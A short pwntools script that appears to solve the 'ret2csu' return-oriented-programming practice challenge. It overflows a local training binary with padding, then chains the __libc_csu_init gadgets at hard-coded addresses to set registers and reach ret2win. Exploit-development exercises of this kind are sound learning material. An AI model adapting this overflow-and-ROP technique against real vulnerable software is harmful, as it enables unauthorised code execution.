#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
import time

# break a le fin de pwnme
gs='''
b *pwnme+150
c
'''


# Set up pwntools for the correct architecture
elf =  ELF('ret2csu')
context.binary=elf
# context(terminal=['tmux'])

# Offset avant ecrasement de l'adresse de retour
offset=0x28

ret2win=elf.plt['ret2win']

g_poprdi=0x004006a3
gadget_1=0x0040069a
gadget_2=0x00400680


io = process([elf.path])

if len(sys.argv)>1 and sys.argv[1] == "-d":
    gdb.attach(io,gs)
    time.sleep(1)

# io.recvuntil(b"> ")

PL =b"A"*offset
PL+=p64(gadget_1)
PL+=p64(ret2win//8)          # brx
PL+=p64(ret2win//8)          # rbp
PL+=p64(ret2win%8)           # r12
PL+=p64(0xdeadbeefdeadbeef)  # r13
PL+=p64(0xcafebabecafebabe)  # r14
PL+=p64(0xd00df00dd00df00d)  # r15
PL+=p64(g_poprdi)
PL+=p64(0xd00df00dd00df00d)  # r15
PL+=p64(gadget_2)

io.sendline(PL)
io.interactive()

